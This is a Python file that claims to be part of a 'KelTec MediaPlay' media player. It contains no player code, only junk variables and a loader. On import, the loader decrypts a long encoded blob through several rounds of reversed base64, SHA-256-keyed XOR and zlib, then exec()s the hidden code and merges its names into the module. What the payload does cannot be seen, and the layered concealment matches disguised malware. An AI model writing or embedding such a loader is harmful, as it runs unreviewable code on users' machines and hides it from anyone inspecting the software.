# -*- coding: utf-8 -*-
# KelTec MediaPlay

_lx0_0 = 932178 ^ 135749
_lx1_1 = len("6d4ba1")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-594618)
_lx3_3 = 253471 * 0
_lx4_4 = 155089 ^ 163693
_K = '6cfb86d678733f2236e78c755792b39ec1232355c9b06d7b52b53e9733bb873a'
_M = '/00GiYVCkKCATnmYwNHNnE9YfnxgKlkrp35FX1XDH4zzBQjehBiRrIpKe5vGhsqZTl5wImd6XXDxfEUIVZYShv9VVI3RTMb7jEJ0'
_D = '==QKw1bD9Ter1CQDpd7nJPc91uz/ZxgGadszAl6wxoL0pkZqoSObrvt+/xgbYxEh8/bWIxmv/8LZ/9/ZkZ2lr4uiEP2RYdtjg7jUJE/qhKL9tT6wI9TyTucF+cFLTZWE537xBydSJGgmzyiDYXTx1ExSVx6+/YmBYQAZy/oQnRHKXpwQ15D+akAJ8ex8Y0RQuMmwkW3W0t0PVSmyaP+RhLQj2EFe/0/xWH+KxVclJIpIPumoWc3jplTUsfb60IfNitQjHy7OyQ8fg5Jz42Bz82dFPafNVkHFR7pXwfpSmefRhpvcl/Lt4GIplJ/0uP4sZo64zz1BI/IJqsS+bvmPlFrnAeQhODTpF8ROXta2cM4s/pTNDqvvKriicjke7B9wDETuM5n7JuA5xYI02iSUWHdvN7EXBBmDFtsEuCR05JWxF4mT2FeWjBwbthzMhq/Hvts52+kAnQh89zWQkJ20VFKhzBRI7Zsj75cAMt7B3WUhKgkMQ2q3qsQ3SUkQJcJ9xUa/icJPdAI1AVx3j5CWoqO668DW9H+DJclPVzqZlyAMLliRZRFqslZF2iKiiBFUJZeKg8ojwESN2gCxzZGk4qMjWfMwtNHotrpVUbx6uRyo82lvvIjjzqdHSSEk87xIcY1WLv4dkzbe/BmOdZt3P9HR254N+111Aw/yQEKNkfOBaxjH6KmLDuubYhwFRXYqvZNdlB2cJq8dD1ur6SES/pWve12wmRZB2GxGR3UM1hsxwHUdi901KUNRBkKG80Yuykj8JKZOLZTgOUB85dPl+i5FTYbi5zeeOx7+a8e135e2O/1F12DsP1y9c1vcPPqlrTUCiSAhi36UVZOBvhhymxTdYN2FpIWG4uz81HHsdB2FTxktKyRA3spNDwNEBDO1edoLM8EY//O00jBOLCuYkN23rUDoVfhiQ8HHpfYyhUEd3YwGaWKYiAJH8jo0VCoR2512ar8IJg/2Rwc9BJSBqW4l4t8oN7EW/UoVfZpoSBjqTnKjXb79W0J8s4qOYbjJqZmrWgNX2Pnki0wMM7Xfefr1UhuM0/qz6vAgTV3MxzgA2sHzXZVkSUhF9q9k2/htNy4obWg7Z0h2lYnnnyhj04synRRAdbKazeijp1cd1Ew8kRrfXt8EWwUtyE6HlQ5F0GfiZgFyJI3oryfL0RJlVGQ+QBeAdJIOfVnsnZAwb+rgy2XGsgGedGs7zBL6CO4+BIfn8Q5jf5Cd+LpPNXTsezVzm3VnzUkopswsuDDq/fKArvzs0arnndPypt6VUVRuzpC9gDuQ2+7RrcvbmZ7TSP2ewY5IbkZYD9VWol13zJXuvo9TBeAYizAOyMfv0UMKCDtTRMk29A3N97UpifatvYUEuskaXWH1EMc6+HtPG4VHmtIAkthkOYaPbDD9eN17PW6tDoIshczDucVt1V08l8DMF61WK9d592/D9PZjgHieYJzeAnnCfBD9SiliGcNPxvqEnqlRqiX+ml7ePsVWXaSMuXwAD6MGurVI5zy7e00KfwI2d+QyO3K4LEzhz4od388Y0HzMVcIZo5erEkKWajsfyYGUbxtOYD/0XQtW3z6J6//5nX/8Zw/ks3pmbWbkQqtTJhsPdxZ8lxEjxAbOWy7HBf1YUPdYTQ4Z4RrXuUicTnLjOB7GF0yUlZdUbIUn96zNdq3huaCMxqqUpM+nma/xk2yJp9AgNSMxjLjYjt2lL2BaopFDiph0JyJu7mt8t4WufsjGIggr7cQpMt8twQ4oOOuW4qDVZ+HhR+CepTLgc3PBctAThiy4W10FgFtVvnTL1SUTFh0p6oTmPEXGXQ5axshOYxaNjCuzvpnfs+7gtlF+oyhm'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})